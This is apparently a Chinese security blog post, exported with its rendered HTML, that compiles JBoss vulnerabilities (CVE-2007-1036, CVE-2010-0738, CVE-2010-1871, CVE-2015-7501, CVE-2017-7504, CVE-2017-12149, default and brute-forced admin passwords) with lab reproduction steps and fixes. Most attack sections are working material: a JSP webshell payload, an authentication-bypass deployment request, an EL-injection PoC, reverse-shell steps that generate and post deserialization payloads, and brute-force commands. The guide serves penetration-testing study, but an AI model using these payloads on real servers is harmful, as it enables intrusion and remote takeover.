漏洞原理\n\nJBoss默认仅对“GET”和“POST”方法启用安全限制；使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证\n\n```shell\njboss-4.2.3.GA/server/default/deploy/jmx-console.war/WEB-INF/web.xml\n```\n\n![image-20200701103827156](/images/Jboss/image-20200701103827156.png)\n\n##### 漏洞检测\n\n1、URL请求\n\n```shell\nhttp://172.16.144.139:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository\n```\n\n![image-20200701142719465](/images/Jboss/image-20200701142719465.png)\n\n2、参数对应值\n\n```shell\n# 路径\nshell.war\n# 文件名\nshell\n# 文件后缀\n.jsp\n# 文件内容\n<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>\n\n# 如POST提交需认证，修改请求方法未HEAD并复制POST数据至URL处\naction=invokeOp&name=jboss.admin:service=DeploymentFileRepository&methodIndex=6&arg0=../jmx-console.war/&arg1=shell&arg2=.jsp&arg3=<%Runtime.getRuntime().exec(request.getParameter(\"i\"));%>&arg4=True\n# 访问(获取当前目录文件夹及文件)\nhttp://172.16.144.139:8080/jmx-console/shell.jsp?i=touch%201.txt\n```\n\n![image-20200701153249170](/images/Jboss/image-20200701153249170.png)\n\n![image-20200701152708158](/images/Jboss/image-20200701152708158.png)\n\n3、shell新建文件\n\n```shell\nhttp://172.16.144.139:8080/shell/shell.jsp?i=touch%201.txt\n```\n\n![image-20200701152747850](/images/Jboss/image-20200701152747850.png)\n\n![image-20200701152836122](/images/Jboss/image-20200701152836122.png)\n\n##### 漏洞修复\n\n1、升级最新版本\n\n2、设置登录认证(参考CVE-2007-1036修复)\n\n#### CVE-2010-1871\n\n##### 漏洞描述\n\n`JBossSeam`是一个`JavaEE5`框架，把JSF与`EJB3.0`组件合并在一起，从而为开发基于Web的企业应用程序提供一个最新的模式。\n\n`JBossSeam`处理某些参数化`JBossEL`表达式的方式存在输入过滤漏洞。如果远程攻击者能够诱骗通过认证的`JBossSeam`用户访问特制的网页，就可能导致执行任意代码。\n\n##### 影响范围\n\nJBoss AS = 4.3.0（4.3.0属于企业版，导致部分环境没法搭建复现）\n\n```shell\n//4.3.0等版本下载\nhttp://ftp.riken.jp/Linux/redhat/ftp.redhat.com/jboss/eap/4.3.0/en/source/\n```\n\n##### 漏洞原理\n\n漏洞是通过`seam`组件中插入`#{payload}`进行模板注入，通过Java反射机制来获取到（`Java.lang.Runtime.getRuntime().exec()`方法），从而可以传入任何想要执行的命令。\n\n##### 漏洞检测\n\n1、漏洞位置描述\n\n漏洞是通过seam组件中插入#{payload}进行模板注入，可以在以下链接中插入要执行的方法，通过Java反射机制来获取到（`Java.lang.Runtime.getRuntime().exec()`方法）,从而可以传入任何想要执行的命令。\n\n```shell\n/admin-console/login.seam?actionOutcome=/success.xhtml?user%3d%23{}的#{}\n```\n\n2、PoC\n\ncmd代表传入的远程命令。在`/admin-console/login.seam`路径下，POST传入构造好的`payload`，即可对此漏洞利用。\n\n```java\nactionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('Java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('Java.lang.Runtime')).exec(cmd)}\n```\n\n##### 漏洞修复\n\n1、补丁修复\n\n#### CVE-2013-4810\n\n##### 漏洞描述\n\n此漏洞和`CVE-2015-7501`漏洞原理相同，两者的区别就在于两个漏洞选择的进行其中`JMXInvokerServlet`和`EJBInvokerServlet`利用的是`org.jboss.invocation.MarshalledValue`进行的反序列化操作，\n\n而`web-console/Invoker`利用的是`org.jboss.console.remote.RemoteMBeanInvocation`进行反序列化并上传构造好文件。\n\n##### 影响范围\n\nJBoss AS 6.X\n\n##### 漏洞原理\n\n\n\n##### 漏洞检测\n\n1、参考CVE-2015-7501\n\n```\n//漏洞路径\n/invoker/EJBInvokerServlet\nhttp://172.16.144.157:8080/invoker/EJBInvokerServlet\n```\n\n![image-20200702153308520](/images/Jboss/image-20200702153308520.png)\n\n2、反弹shell\n\n直接参考CVE-2015-7501\n\n##### 漏洞修复\n\n1、[补丁](https://access.redhat.com/security/cve/cve-2015-7501)\n\n#### CVE-2015-7501\n\n##### 漏洞描述\n\n由于`JBoss`中`invoker/JMXInvokerServlet`路径对外开放，JBoss的`jmx`组件⽀持Java反序列化导致产生漏洞。\n\n##### 影响范围\n\nJBoss AS 6.x\n\n##### 漏洞原理\n\n由于`JBoss`中`invoker/JMXInvokerServlet`路径对外开放\n\n##### 漏洞检测\n\n1、PoC\n\n浏览器直接访问域名，如出现下载文档即可确定存在漏洞。\n\n```\nhttp://172.16.144.156:8080/invoker/JMXInvokerServlet\n```\n\n![image-20200702122358123](/images/Jboss/image-20200702122358123.png)\n\n2、反弹shell\n\n```shell\n# nc -lvnp 5555(攻击主机执行监听)\n//攻击主机目录下下载\n# wget http://scan.javasec.cn/java/JavaDeserH2HC.zip\n# unzip JavaDeserH2HC.zip\n# cd JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)\n# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\n# java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:5555\t\t\t\t(攻击主机及端口号)\n# curl http://172.16.144.157:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n```\n\n![image-20200702134459047](/images/Jboss/image-20200702134459047.png)\n\n##### 漏洞修复\n\n1、[补丁](https://access.redhat.com/security/cve/cve-2015-7501)\n\n#### CVE-2017-7504\n\n##### 漏洞描述\n\nJBoss AS 4.x及之前版本中，JbossMQ实现过程的`JMS over HTTP Invocation Layer`的\nHTTPServerILServlet.java⽂件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利⽤\n该漏洞执⾏任意代码。\n\n##### 影响范围\n\nJBoss AS 4.x之前版本\n\n##### 漏洞原理\n\nJBoss AS 4.x及之前版本中，JbossMQ实现过程的`JMS over HTTP Invocation Layer`的\nHTTPServerILServlet.java⽂件存在反序列化漏洞。\n\n##### 漏洞检测\n\n1、PoC\n\n访问域名，如出现以下返回可能存在漏洞。\n\n```\n172.16.144.157:8080/jbossmq-httpil/HTTPServerILServlet\n```\n\n![image-20200702140433362](/images/Jboss/image-20200702140433362.png)\n\n2、反弹shell\n\n```shell\n# nc -lvnp 6666(攻击主机执行监听)\n//攻击主机目录下下载\n# wget http://scan.javasec.cn/java/JavaDeserH2HC.zip\n# unzip JavaDeserH2HC.zip\n# cd JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)\n# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\n# java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.157:6666\t\t\t\t(攻击主机及端口号)\n# curl http://172.16.144.157:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n```\n\n![image-20200702142036913](/images/Jboss/image-20200702142036913.png)\n\n![image-20200702142043798](/images/Jboss/image-20200702142043798.png)\n\n##### 漏洞修复\n\n1、版本升级\n\n\n\n#### CVE-2017-12149\n\n##### 漏洞描述\n\n此漏洞主要是由于`jboss\\server\\all\\deploy\\httpha-invoker.sar\\invoker.war\\WEB-INF\\classes\\org\\jboss\\invocation\\http\\servlet`目录下的`ReadOnlyAccessFilter.class`文件中的`doFilter`方法，再将序列化传入`ois`中，并没有进行过滤便调用了`readObject()`进行反序列化，导致传入的携带恶意代码的序列化数据执行，造成了反序列化的漏洞。\n\n##### 影响范围\n\nJBossAS 5.x\n\nJBossAS 6.x\n\n##### 漏洞原理\n\n该漏洞存在于JBoss AS的HttpInvoker 组件中的ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。\n\n##### 漏洞检测\n\n1、版本确定\n\n![image-20200630152601209](/images/Jboss/image-20200630152601209.png)\n\n2、PoC访问\n\n````shell\nhttp://172.16.144.135:8080/invoker/readonly\n//如出现500可确定目标主机存在漏洞\n````\n\n![image-20200630152657545](/images/Jboss/image-20200630152657545.png)\n\n3、反弹shell\n\n```shell\n# nc -lvnp 8888(攻击主机执行监听)\n//攻击主机目录下下载\n# wget http://scan.javasec.cn/java/JavaDeserH2HC.zip\n# unzip JavaDeserH2HC.zip\n# cd JavaDeserH2HC(以下命令均在攻击主机目录下执行，执行java生成序列化数据)\n# javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java\n# java -cp .:commons-collections-3.2.1.jar  ReverseShellCommonsCollectionsHashMap 172.16.144.135:8888\t\t\t\t(攻击主机及端口号)\n# curl http://172.16.144.135:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser\n```\n\n![image-20200630221608353](/images/Jboss/image-20200630221608353.png)\n\n![image-20200630221503084](/images/Jboss/image-20200630221503084.png)\n\n##### 漏洞修复\n\n1、删除http-invoker.sar组件\n\n2、版本升级(此漏洞只存在AS5、AS6)\n\n#### Administration Console 弱口令\n\n##### 漏洞描述\n\n`Administration Console`存在默认密码`admin admin`,我们可以登录到后台部署war包`getshell`\n\n##### 影响范围\n\n全版本\n\n##### 漏洞原理\n\nJBoss默认Console是admin/admin.\n\n##### 漏洞检测\n\n1、访问以下URL\n\n```shell\nhttp://172.16.144.157:8080/jmx-console/\n```\n\n![image-20200702151249993](/images/Jboss/image-20200702151249993.png)\n\n2、远程部署war\n\n这部分直接参考`CVE-2007-1036`操作基本一致\n\n##### 漏洞修复\n\n1、修改默认账户及密码（足够强壮）\n\n#### JBoss >7.x弱口令及爆破\n\n##### 漏洞描述\n\n`jboss`从8开始正式更名为`WildFly` ,在`WildFly8`之后的版本添加控制台用户时默认就会执行强密码策略,所以相对于之前低版本的`jboss`,针对`WildFly`之后版本的弱口令推荐`wildPwn`自动化爆破工具。\n\n##### 漏洞范围\n\nJBoss >7.x（wildFly所需jdk版本为7及以上才行）\n\n##### 漏洞原理\n\nJBoss 8之后开始更名为`WildFly`其默认采用强密码策略，但也会存在可爆破风险。\n\n```shell\n//部署指定目录\n/usr/local/wildfly-8.0.0.Final\n//修改环境路径\nexport JBOSS_HOME=/usr/local/wildfly-8.0.0.Final/\nexport PATH=$PATH:$JBOSS_HOME/bin\n//添加新账户\n# ./add-user.sh\nWhat type of user do you wish to add?\n a) Management User (mgmt-users.properties)\n b) Application User (application-users.properties)\n(a): a\n\nEnter the details of the new user to add.\nUsing realm 'ManagementRealm' as discovered from the existing property files.\nUsername : admin\nThe username 'admin' is easy to guess\nAre you sure you want to add user 'admin' yes/no? yes\nPassword recommendations are listed below. To modify these restrictions edit the add-user.properties configuration file.\n - The password should not be one of the following restricted values {root, admin, administrator}\n - The password should contain at least 8 characters, 1 alphanumeric character(s), 1 digit(s), 1 non-alphanumeric symbol(s)\n - The password should be different from the username\nPassword :\nJBAS015269: Password must have at least 8 characters!\nAre you sure you want to use the password entered yes/no? yes\nRe-enter Password :\nWhat groups do you want this user to belong to? (Please enter a comma separated list, or leave blank for none)[  ]:\nAbout to add user 'admin' for realm 'ManagementRealm'\nIs this correct yes/no? yes\nAdded user 'admin' to file '/usr/local/wildfly-8.0.0.Final/standalone/configuration/mgmt-users.properties'\nAdded user 'admin' to file '/usr/local/wildfly-8.0.0.Final/domain/configuration/mgmt-users.properties'\nAdded user 'admin' with groups  to file '/usr/local/wildfly-8.0.0.Final/standalone/configuration/mgmt-groups.properties'\nAdded user 'admin' with groups  to file '/usr/local/wildfly-8.0.0.Final/domain/configuration/mgmt-groups.properties'\nIs this new user going to be used for one AS process to connect to another AS process?\ne.g. for a slave host controller connecting to the master or for a Remoting connection for server to server EJB calls.\nyes/no? yes\nTo represent the user add the following to the server-identities definition <secret value=\"dG9vcg==\" />\n\n//启动JBoss(静默启动，程序会在后台运行)\n# ./standalone.sh -Djboss.bind.address=0.0.0.0 -Djboss.bind.address.management=0.0.0.0&\n```\n\n##### 漏洞检测\n\n1、URL访问\n\n```shell\n//默认监听端口在9990\nhttp://172.16.144.158:9990/\n```\n\n![image-20200702202856723](/images/Jboss/image-20200702202856723.png)\n\n2、爆破\n\n```shell\n# git clone https://github.com/hlldz/wildPwn.git\n# cd wildPwn\n# python wildPwn.py -m brute --target 172.16.144.183 --port 8080 -user userList.txt -pass passList.txt\n\nnmap ‐n -Pn ‐‐script=wildfly‐brute.nse ‐‐script‐args \"userdb=userList.txt,passdb=pass.txt,hostname=domain.com\" 172.16.144.183 -p9990\n```\n\n貌似这个工具并没法实现爆破。\n\n##### 漏洞修复\n\n1、配置强口令\n\n2、限制来源IP\n\n### 总结\n\n以上CVE汇总根据网上各大佬汇总得到，其中部分CVE使用的`JavaDeserH2HC`工具已经在环境搭建部分贴出；还有很多其他工具请自行github或google了。\n\n### 参考\n\n```\nhttps://www.freebuf.com/articles/web/240174.html\nhttps://bugzilla.redhat.com/show_bug.cgi?id=615956\n```\n\n","slug":"Jboss漏洞汇总","published":1,"updated":"2020-10-23T03:35:22.516Z","_id":"ckglobhea0011b1hqazybbu5n","comments":1,"layout":"post","photos":[],"link":"","content":"<p>JBoss是一套开源的企业级 Java 中间件系统，用于实现基于 SOA 的企业应用和服务</p>\n<p>JBoss AS 开源社区版本，发布比较频繁。JBoss 7 ，先后发布了 7.0.0, 7.0.1, 7.0.2, 7.1.0, 7.1.1, 7.1.2, 7.1.3, 7.2.0，其中 7.1.1 比较经典，7.2.0 是 JBoss EAP 6.1 的基础zhi，但7.1.2, 7.1.3, 7.2.0 只是源代码打了 Tag，并没提供开放下载。</p>\n<p>JBoss EAP（Enterprise Application Platform） 在开源版本上构建的企业版本，目前Redhat 已经将 JBoss EAP 放在 JBoss.org 开放下载，开发人无需注册 Redhat （之前是必须有 Redhat.com 账号才能下载 JBoss EAP）。</p>\n<p>Wildfly 是 JBoss AS 新的项目名称，从 8 开始，新的 JBoss AS 正式有一个名字，叫 WildFly， 目前已经发布 8 Beta 版本，针对开发人员的 Java EE 7 功能已经完全实现。</p>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><h4 id=\"jdk安装\"><a href=\"#jdk安装\" class=\"headerlink\" title=\"jdk安装\"></a>jdk安装</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://www.oracle.com/java/technologies/javase/javase-jdk8-downloads.html</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200629230736581.png\" alt=\"image-20200629230736581\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> mkdir /usr/java</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> cp jdk-6u32-linux-x64-rpm.bin /usr/java/</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> chmod +x jdk-6u32-linux-x64-rpm.bin</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ./jdk-6u32-linux-x64-rpm.bin</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ls</span></span><br><span class=\"line\">default                     latest                                 sun-javadb-demo-10.6.2-1.1.i386.rpm</span><br><span class=\"line\">jdk1.6.0_32                 sun-javadb-client-10.6.2-1.1.i386.rpm  sun-javadb-docs-10.6.2-1.1.i386.rpm</span><br><span class=\"line\">jdk-6u32-linux-amd64.rpm    sun-javadb-common-10.6.2-1.1.i386.rpm  sun-javadb-javadoc-10.6.2-1.1.i386.rpm</span><br><span class=\"line\">jdk-6u32-linux-x64-rpm.bin  sun-javadb-core-10.6.2-1.1.i386.rpm</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> vi /etc/profile</span></span><br><span class=\"line\">export JAVA_HOME=/usr/java/jdk1.6.0_32</span><br><span class=\"line\">export CLASSPATH=.:$JAVA_HOME/jre/lib/rt.jar:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class=\"line\">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">source</span> /etc/profile</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> java -version</span></span><br><span class=\"line\">java version &quot;1.6.0_32&quot;</span><br><span class=\"line\">Java(TM) SE Runtime Environment (build 1.6.0_32-b05)</span><br><span class=\"line\">Java HotSpot(TM) 64-Bit Server VM (build 20.7-b02, mixed mode)</span><br><span class=\"line\">OK</span><br><span class=\"line\">//也可以使用yum进行安装jdk</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> yum -y list java*\t\t\t//会列出所有jdk版本信息</span></span><br><span class=\"line\">//安装指定jdk</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> yum -y install java-1.7.0-openjdk*</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> java -version</span></span><br><span class=\"line\">java version &quot;1.7.0_261&quot;</span><br><span class=\"line\">OpenJDK Runtime Environment (rhel-2.6.22.2.el7_8-x86_64 u261-b02)</span><br><span class=\"line\">OpenJDK 64-Bit Server VM (build 24.261-b02, mixed mode)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"JBoss版本\"><a href=\"#JBoss版本\" class=\"headerlink\" title=\"JBoss版本\"></a>JBoss版本</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//JBoss全版本下载</span><br><span class=\"line\">https://jbossas.jboss.org/downloads</span><br><span class=\"line\">https://teddysun.com/260.html</span><br><span class=\"line\">//6.0版本</span><br><span class=\"line\">https://sourceforge.net/projects/jboss/files/JBoss/JBoss-6.0.0.Final/</span><br><span class=\"line\">//4.2.3版本</span><br><span class=\"line\">http://sourceforge.net/projects/jboss/files/JBoss/JBoss-4.2.3.GA/jboss-4.2.3.GA.zip/download</span><br></pre></td></tr></table></figure>\n\n<p>版本6.0</p>\n<p>JBoss-6.0.0.Final</p>\n<p><img src=\"/images/Jboss/image-20200629174602625.png\" alt=\"image-20200629174602625\"></p>\n<h4 id=\"JBoss安装\"><a href=\"#JBoss安装\" class=\"headerlink\" title=\"JBoss安装\"></a>JBoss安装</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> unzip jboss-as-distribution-6.0.0.Final.zip</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ll</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> 版本替换须重启系统，以免无法访问最新替换系统。或启动run时报错。</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> vim /etc/profile</span></span><br><span class=\"line\">export JBOSS_HOME=/usr/local/jboss-6.0.0.Final/</span><br><span class=\"line\">export PATH=$PATH:$JBOSS_HOME/bin</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">source</span> /etc/profile</span></span><br><span class=\"line\">//启动</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ./run.sh -b 0.0.0.0</span></span><br><span class=\"line\">//curl请求尝试</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> curl -I http://127.0.0.1:8080/</span></span><br><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Server: Apache-Coyote/1.1</span><br><span class=\"line\">X-Powered-By: Servlet/3.0; JBossAS-6</span><br><span class=\"line\">Accept-Ranges: bytes</span><br><span class=\"line\">ETag: W/&quot;1554-1293496144000&quot;</span><br><span class=\"line\">Last-Modified: Tue, 28 Dec 2010 00:29:04 GMT</span><br><span class=\"line\">Content-Type: text/html</span><br><span class=\"line\">Content-Length: 1554</span><br><span class=\"line\">Date: Tue, 30 Jun 2020 12:22:53 GMT</span><br><span class=\"line\">//关闭本地防火墙防止无法访问</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> systemctl stop firewalld.service</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630134941050.png\" alt=\"image-20200630134941050\"></p>\n<h4 id=\"JavaDeserH2HC\"><a href=\"#JavaDeserH2HC\" class=\"headerlink\" title=\"JavaDeserH2HC\"></a>JavaDeserH2HC</h4><p>此工具主要用于检测和测试反序列化类漏洞，项目地址已经贴到下面。</p>\n<p><a href=\"https://github.com/joaomatosf/JavaDeserH2HC\">JavaDeserH2HC</a></p>\n<h3 id=\"漏洞分类实战\"><a href=\"#漏洞分类实战\" class=\"headerlink\" title=\"漏洞分类实战\"></a>漏洞分类实战</h3><h4 id=\"CVE-2006-5750\"><a href=\"#CVE-2006-5750\" class=\"headerlink\" title=\"CVE-2006-5750\"></a>CVE-2006-5750</h4><h5 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>CVE-2007-1036漏洞相同，CVE-2006-5750漏洞利用methodIndex进行store()方法的调用。其中methodIndex是通过方法的编号进行调用。</p>\n<h5 id=\"影响范围\"><a href=\"#影响范围\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><h5 id=\"漏洞原理\"><a href=\"#漏洞原理\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><h5 id=\"漏洞检测\"><a href=\"#漏洞检测\" class=\"headerlink\" title=\"漏洞检测\"></a>漏洞检测</h5><h5 id=\"漏洞修复\"><a href=\"#漏洞修复\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>1、参考CVE-2010-0738漏洞</p>\n<h4 id=\"CVE-2007-1036\"><a href=\"#CVE-2007-1036\" class=\"headerlink\" title=\"CVE-2007-1036\"></a>CVE-2007-1036</h4><p>JMX Console HtmlAdaptor Getshell</p>\n<h5 id=\"漏洞描述-1\"><a href=\"#漏洞描述-1\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>由于JBoss对 /jmx-console/HtmlAdaptor 路径未做任何认证措施，导致这个服务完全对外开放，可直接访问控制台部署shell。</p>\n<h5 id=\"影响范围-1\"><a href=\"#影响范围-1\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>全版本</p>\n<h5 id=\"漏洞原理-1\"><a href=\"#漏洞原理-1\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>此漏洞主要是由于JBoss中/jmx-console/HtmlAdaptor路径对外开放，并且没有任何身份验证机制，导致攻击者可以进入到jmx控制台，并在其中执行任何功能。</p>\n<h5 id=\"漏洞实战\"><a href=\"#漏洞实战\" class=\"headerlink\" title=\"漏洞实战\"></a>漏洞实战</h5><p>1、URL访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.135:8080/jmx-console/</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630141919387.png\" alt=\"image-20200630141919387\"></p>\n<p>2、创建war包木马</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">➜  jsp jar -cvf muma.war shell.jsp</span><br></pre></td></tr></table></figure>\n\n<p>3、部署远程木马</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">部署远程war必须确保war提供web能够访问否则怎么叫远程部署呢？</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630143911494.png\" alt=\"image-20200630143911494\"></p>\n<p><img src=\"/images/Jboss/image-20200630143935231.png\" alt=\"image-20200630143935231\"></p>\n<center>部署完成结果</center>\n4、访问木马\n\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://172.16.144.135:8080/muma/shell.jsp</span><br><span class=\"line\">//如出现500即为部署成功只是无法解析</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630144229517.png\" alt=\"image-20200630144229517\"></p>\n<p>5、管理工具连接</p>\n<p><img src=\"/images/Jboss/image-20200630144201038.png\" alt=\"image-20200630144201038\"></p>\n<h5 id=\"漏洞修复-1\"><a href=\"#漏洞修复-1\" class=\"headerlink\" title=\"漏洞修复\"></a>漏洞修复</h5><p>因jboss默认未设置密码，导致jmx-console可远程部署war并导致被攻击。</p>\n<p>1、开启安全配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//注释去掉(6.x版本修改下面文件)</span><br><span class=\"line\">/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/jboss-web.xml</span><br><span class=\"line\">//4.x版本修改下面文件</span><br><span class=\"line\">/server/default/deploy/jmx-console.war/WEB-INF/jboss-web.xml</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630145646406.png\" alt=\"image-20200630145646406\"></p>\n<p>2、web.xml配置</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/local/jboss-6.0.0.Final/common/deploy/jmx-console.war/WEB-INF/web.xml</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630145856647.png\" alt=\"image-20200630145856647\"></p>\n<p>3、设置账号及密码</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修改账号及密码（默认是admin/admin）</span><br><span class=\"line\">server/default/conf/props/jmx-console-users.properties</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630150052719.png\" alt=\"image-20200630150052719\"></p>\n<p>4、访问</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//修改以上配置后记得重启Jboss</span><br><span class=\"line\">//直接停止run.sh</span><br><span class=\"line\">//进程查看</span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> ps aux | grep jboss</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\"> <span class=\"built_in\">kill</span> -9 PID</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/Jboss/image-20200630150711860.png\" alt=\"image-20200630150711860\"></p>\n<h4 id=\"CVE-2010-0738\"><a href=\"#CVE-2010-0738\" class=\"headerlink\" title=\"CVE-2010-0738\"></a>CVE-2010-0738</h4><h5 id=\"漏洞描述-2\"><a href=\"#漏洞描述-2\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h5><p>JBoss默认仅对“GET”和“POST”方法启用安全限制。</p>\n<p>使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证，直接调用jmx-console实现的任何功能。</p>\n<p>注意：如果JMX控制台回复HTTP 500错误，则表示请求已正确处理。</p>\n<h5 id=\"影响范围-2\"><a href=\"#影响范围-2\" class=\"headerlink\" title=\"影响范围\"></a>影响范围</h5><p>JBossAS &lt; 4.3</p>\n<h5 id=\"漏洞原理-2\"><a href=\"#漏洞原理-2\" class=\"headerlink\" title=\"漏洞原理\"></a>漏洞原理</h5><p>JBoss默认仅对“GET”和“POST”方法启用安全限制；使用“HEAD”等其他HTTP方法发出请求，可以绕过身份验证</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span 